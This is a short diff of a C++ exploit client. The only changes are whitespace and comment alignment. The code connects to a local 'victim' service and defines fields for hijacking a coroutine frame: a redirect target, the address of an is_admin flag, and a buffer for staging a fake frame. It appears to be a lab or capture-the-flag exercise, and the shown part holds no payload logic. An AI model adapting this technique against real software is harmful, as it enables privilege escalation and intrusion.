@@ -42,8 +42,8 @@ static constexpr const char *VICTIM_HOST = "127.0.0.1";
 
 struct Conn {
     int fd = -1;
-    FILE *rx = nullptr; // buffered reads
-    FILE *tx = nullptr; // buffered writes (same fd)
+    FILE *rx = nullptr;  // buffered reads
+    FILE *tx = nullptr;  // buffered writes (same fd)
 
     static Conn open() {
         Conn c;
@@ -54,6 +54,7 @@ struct Conn {
         }
 
         struct sockaddr_in sa {};
+
         sa.sin_family = AF_INET;
         sa.sin_port = htons(VICTIM_PORT);
         inet_pton(AF_INET, VICTIM_HOST, &sa.sin_addr);
@@ -75,7 +76,7 @@ struct Conn {
     void close_conn() {
         send("QUIT\n");
         char buf[64] = {};
-        (void)fgets(buf, sizeof buf, rx); // consume "OK bye"
+        (void)fgets(buf, sizeof buf, rx);  // consume "OK bye"
         fclose(rx);
         fclose(tx);
         fd = -1;
@@ -112,13 +113,13 @@ struct Conn {
 // ─────────────────────────────────────────────────────────────────────────────
 
 struct VictimInfo {
-    uintptr_t worker_frame = 0;  // base of the live worker coroutine frame
-    uintptr_t resume_fn = 0;     // legitimate resume stub (in victim .text)
-    uintptr_t destroy_fn = 0;    // legitimate destroy stub
-    uintptr_t hijack_target = 0; // attacker's redirect goal (in victim .text)
-    uintptr_t is_admin_ptr = 0;  // &is_admin inside the privileged coroutine
-    uintptr_t scratch_buf = 0;   // writable buffer for staging a fake frame
-    uintptr_t handle_store = 0;  // address of g_redirectable_handle (a void*)
+    uintptr_t worker_frame = 0;   // base of the live worker coroutine frame
+    uintptr_t resume_fn = 0;      // legitimate resume stub (in victim .text)
+    uintptr_t destroy_fn = 0;     // legitimate destroy stub
+    uintptr_t hijack_target = 0;  // attacker's redirect goal (in victim .text)
+    uintptr_t is_admin_ptr = 0;   // &is_admin inside the privileged coroutine
+    uintptr_t scratch_buf = 0;    // writable buffer for staging a fake frame
+    uintptr_t handle_store = 0;   // address of g_redirectable_handle (a void*)
 };
 
 // ─────────────────────────────────────────────────────────────────────────────
